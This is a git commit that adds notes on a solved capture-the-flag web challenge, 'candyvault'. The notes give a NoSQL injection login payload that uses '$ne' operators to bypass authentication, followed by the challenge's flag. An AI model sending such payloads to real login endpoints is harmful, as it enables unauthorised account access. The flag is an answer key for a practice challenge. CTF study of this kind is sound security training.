129ce63d2f80028ecd081b6c4e715129fb8c0ad9
szhan21 <shunda.zhang@intel.com>
2023-10-24 19:11:16 +0800

    Solved candyvault!

---
+++ HackTheBoo_Practice/web_candyvault/dec.py
@@ -0,0 +1,16 @@
+'''
+NoSQL injection
+
+POST /login
+
+{
+    "email":{
+        "$ne":"asdf"
+    },
+    "password":{
+        "$ne":"asdf"
+    }
+}
+
+HTB{w3lc0m3_to0o0o_th3_c44andy_v4u1t!}
+'''
